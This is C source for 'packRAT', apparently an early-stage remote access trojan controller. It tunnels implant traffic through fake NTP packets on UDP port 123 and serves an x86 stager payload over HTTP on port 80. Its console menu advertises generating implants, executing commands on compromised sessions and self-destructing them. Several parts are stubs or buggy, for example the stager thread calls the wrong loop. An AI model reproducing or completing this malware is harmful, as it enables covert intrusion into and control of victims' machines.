#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include "stagers.h"


/*
                              $$\       $$$$$$$\   $$$$$$\ $$$$$$$$\ 
                              $$ |      $$  __$$\ $$  __$$\\__$$  __|
 $$$$$$\   $$$$$$\   $$$$$$$\ $$ |  $$\ $$ |  $$ |$$ /  $$ |  $$ |   
$$  __$$\  \____$$\ $$  _____|$$ | $$  |$$$$$$$  |$$$$$$$$ |  $$ |   
$$ /  $$ | $$$$$$$ |$$ /      $$$$$$  / $$  __$$< $$  __$$ |  $$ |   
$$ |  $$ |$$  __$$ |$$ |      $$  _$$<  $$ |  $$ |$$ |  $$ |  $$ |   
$$$$$$$  |\$$$$$$$ |\$$$$$$$\ $$ | \$$\ $$ |  $$ |$$ |  $$ |  $$ |   
$$  ____/  \_______| \_______|\__|  \__|\__|  \__|\__|  \__|  \__|   
$$ |                                                                 
$$ |                                                                 
\__|                                                                 

*/

//Regular text
#define BLK "\e[0;30m"
#define RED "\e[0;31m"
#define GRN "\e[0;32m"
#define YEL "\e[0;33m"
#define BLU "\e[0;34m"
#define MAG "\e[0;35m"
#define CYN "\e[0;36m"
#define WHT "\e[0;37m"

//Regular bold text
#define BBLK "\e[1;30m"
#define BRED "\e[1;31m"
#define BGRN "\e[1;32m"
#define BYEL "\e[1;33m"
#define BBLU "\e[1;34m"
#define BMAG "\e[1;35m"
#define BCYN "\e[1;36m"
#define BWHT "\e[1;37m"

//Reset
#define CRESET "\e[0m"

#define NTP_RESPONSE (char[]) {0x24, 0x01, 0x03, 0xed, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x53, 0x48, 0x4d, 0x00, 0xe7, 0x67, 0x93, 0x35, 0x1f, 0x92, 0xd1, 0xda, 0xbf, 0xb5, 0xd2, 0x4c, 0x5c, 0xc0, 0x1c, 0xb0, 0xe7, 0x67, 0x93, 0x3b, 0xb3, 0x39, 0x71, 0x8d, 0xe7, 0x67, 0x93, 0x3b, 0xb3, 0x3c, 0x06, 0xb5}

#define NULL_MSG (char[]) {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}


#define STAGE_REQUEST_HEADER (char*) "GET /"
#define STAGE_REQUEST_MIDDLE (char*) " HTTP/1.1\n\rHost: "
#define STAGE_REQUEST_FOOTER (char*) "\n\r\n\r"




int* running;

typedef struct command {
    char *str;
    struct Command* next;
} Command;

typedef struct listener {
    unsigned int id;
    char buf[65536];
    Command* pending;
} Listener;


// Set up initial UDP listener on port 123 bound to any interface
int recv_sock;
struct sockaddr_in server_addr, implant_addr;
socklen_t implant_addr_len = sizeof(implant_addr);
char recv_msg[60];
char data[1024];

// Set up TCP listener on port 80 bound to any interface
int stage_sock;
struct sockaddr_in stage_addr, pwn_addr;
socklen_t pwn_addr_len = sizeof(pwn_addr);
char stage_req[1024];



Listener* listeners = NULL;
int id_counter = 0;


void print(char* msg) {
    printf(CRESET "  %s\n" CRESET, msg);
}

void error(char* msg) {
    printf(RED "  [ERROR]: %s\n" CRESET, msg);
}

void info (char* msg) {
    printf(BLU "  [INFO]: %s\n" CRESET, msg);
}

void success (char* msg) {
    printf(GRN "  [SUCCESS]: %s\n" CRESET, msg);
}

int promptInt(char* prompt) {
    printf(BMAG "  %s >" CRESET, prompt);
    int i;
    scanf("%d", &i);
    return i;
}

char* promptStr(char* prompt) {
    printf(BMAG "  %s >" CRESET, prompt);
    char* str = malloc(1024);
    scanf("%s", str);
    return str;
}

int stager_req_id(char* req) {
    if (strlen(req) < strlen(STAGE_REQUEST_HEADER) || strncmp(req, STAGE_REQUEST_HEADER, strlen(STAGE_REQUEST_HEADER)) != 0) {
        return -1;
    }
    for (int i = 0; i < strlen(req) - strlen(STAGE_REQUEST_HEADER); i++) {
        if (req[i + strlen(STAGE_REQUEST_HEADER)] == ' ') {
            //host[i] = 0;
            break;
        }
    }
    if (strlen(req) < strlen(STAGE_REQUEST_FOOTER) || strncmp(req + (strlen(req) - strlen(STAGE_REQUEST_FOOTER)), STAGE_REQUEST_FOOTER, strlen(STAGE_REQUEST_FOOTER)) != 0) {
        return -2;
    }
    return atoi(req + strlen(STAGE_REQUEST_HEADER));
}

char* stager_req_ip(char* req) {
    char* r = malloc(strlen(req) + 1);
    strcpy(r, req);
    r = strtok(r, " ");
    r = strtok(NULL, " ");
    r = strtok(NULL, " ");
    r = strtok(NULL, " ");
    r = strtok(r, "\n");
    return r;
}

char* gen_stager_resp(int id, char* host) {
    char* resp = malloc(sizeof(X86_STAGER));
    memcpy(resp, X86_STAGER, sizeof(X86_STAGER));
    return resp;
}

int init_stager() {
    // Create TCP socket
    stage_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(stage_sock < 0){
        error("Problem while creating staging socket\n");
        return -1;
    }

    int port = 80;
    int bind_succes = 0;

    // Set port and IP:
    stage_addr.sin_family = AF_INET;
    stage_addr.sin_port = htons(80);
    stage_addr.sin_addr.s_addr = inet_addr("0.0.0.0");

    // Bind to the set port and IP:
    while(bind(stage_sock, (struct sockaddr*)&stage_addr, sizeof(stage_addr)) < 0){
        printf(RED "  [ERROR]: Couldn't bind to port %d, trying port %d\n" CRESET, port, port + 1);
        port++;
        if (port == 90) {
            port = 8080;
        }
        if (port == 8090) {
            error("Port bind failed\n");
            return -1;
        }
    }
    return 0;
}

void *stager_loop(void *vargp) {
    while (*running) {
        // Receive message:
        int recv_len = recvfrom(stage_sock, stage_req, 1024, 0, (struct sockaddr*)&pwn_addr, &pwn_addr_len);
        if(recv_len < 0){
            error("Problem while receiving message\n");
            continue;
        }
        // Parse HTTP request
        int id = stager_req_id(stage_req);
        if (id < 0) {
            error("Invalid HTTP request\n");
            continue;
        }
        char* host = stager_req_ip(stage_req);
        // Respond with an implant matching the requested ID with the correct host
        char* resp = gen_stager_resp(id, host);

        // Send response:
        int send_len = sendto(stage_sock, resp, strlen(resp), 0, (struct sockaddr*)&pwn_addr, pwn_addr_len);
        if(send_len < 0){
            error("Problem while sending message\n");
            continue;
        }
        printf(BLU "  [INFO]: Ping received from ID %d to host %s\n" CRESET, id, host);
    }
    return NULL;
}



int init_network() {
    // Create UDP socket:
    recv_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(recv_sock < 0){
        error("Problem while creating tunneling socket\n");
        return -1;
    }

    int port = 123;
    int bind_succes = 0;

    // Set port and IP:
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(123);
    server_addr.sin_addr.s_addr = inet_addr("0.0.0.0");

    // Bind to the set port and IP:
    while(bind(recv_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0){
        printf(RED "  [ERROR]: Couldn't bind to port %d, trying port %d\n" CRESET, port, port + 1);
        port++;
        if (port == 133) {
            error("Port bind failed\n");
            return -1;
        }
    }


    return 0;
}

void *network_loop(void *vargp) {
    while (*running) {
        int i = 0;
        int recv_len = 0;
        do {
            i += recv_len;
            // Receive message:
            recv_len = recvfrom(recv_sock, recv_msg, 60, 0, (struct sockaddr*)&implant_addr, &implant_addr_len);
            if(recv_len < 0){
                error("Problem while receiving message\n");
                continue;
            }
            memcpy(data + i, recv_msg + 52, recv_len - 52);
        } while(memcmp(data + i, NULL_MSG, 8) != 0);
        printf("\n%s\n", data);
        fflush(stdout);
    }
    return NULL;
}



int banner() {
    // Print the banner
    printf(BBLU "\n");
    printf("                              $$\\       $$$$$$$\\   $$$$$$\\ $$$$$$$$\\ \n");
    printf("                              $$ |      $$  __$$\\ $$  __$$\\\\__$$  __|\n");
    printf(" $$$$$$\\   $$$$$$\\   $$$$$$$\\ $$ |  $$\\ $$ |  $$ |$$ /  $$ |  $$ |   \n");
    printf("$$  __$$\\  \\____$$\\ $$  _____|$$ | $$  |$$$$$$$  |$$$$$$$$ |  $$ |   \n");
    printf("$$ /  $$ | $$$$$$$ |$$ /      $$$$$$  / $$  __$$< $$  __$$ |  $$ |   \n");
    printf("$$ |  $$ |$$  __$$ |$$ |      $$  _$$<  $$ |  $$ |$$ |  $$ |  $$ |   \n");
    printf("$$$$$$$  |\\$$$$$$$ |\\$$$$$$$\\ $$ | \\$$\\ $$ |  $$ |$$ |  $$ |  $$ |   \n");
    printf("$$  ____/  \\_______| \\_______|\\__|  \\__|\\__|  \\__|\\__|  \\__|  \\__|   \n");
    printf("$$ |                                                                 \n");
    printf("$$ |                                                                 \n");
    printf("\\__|                                                                 \n");
    printf("\n");
    printf("\n" CRESET);
    return 0;
}

int generate() {
    
    info("Implant generated");
    return 0;
}

int help() {
    printf(BCYN "  COMMANDS: \n" CYN);
    printf("    help - Show this help menu\n");
    printf("    generate - Generate a new implant (auto-starts listener)\n");
    printf("    sessions - List all active sessions\n");
    printf("    execute [session ID] [command] - Execute a command on a session and print the output\n");
    printf("    execute all [command] execute a command on all sessions and print a list of the outputs\n");
    printf("    burn [session ID] - Burn a session (self-destruct implant and stop listener)\n");
    printf("    burn all - Burn all sessions (self-destruct all implants and stop listeners)\n");
    printf("    exit - Exit the console\n");
    printf("\n" CRESET);
    return 0;
}

int prompt() {
    // Print the prompt
    printf(BRED "(packRAT) >>" CRESET);

    // Read the input
    char input[256];
    fgets(input, 256, stdin);

    // Execute the command
    if (strcmp(input, "\n") == 0) {
        return 0;
    } else if (strcmp(input, "help\n") == 0) {
        help();
    } else if (strcmp(input, "generate\n") == 0) {
        generate();
    } else if (strcmp(input, "exit\n") == 0) {
        printf("Goodbye!\n\n");
        return 1;
    } else {
        printf(RED "  [ERROR]: Unknown command: %s" CRESET, input);
    }
    return 0;
}


int console() {
    // Print the header
    banner();

    while(!prompt());

    return 0;
}


int main() {


    // Initialize running semaphore
    running = malloc(sizeof(int));
    *running = 1;

    // Initialize the network
    if (init_network() < 0) {
        return -1;
    }

    pthread_t network_thread;
    pthread_create(&network_thread, NULL, network_loop, NULL);

    pthread_t stager_thread;
    pthread_create(&stager_thread, NULL, network_loop, NULL);

    // Launch the console
    return console();
}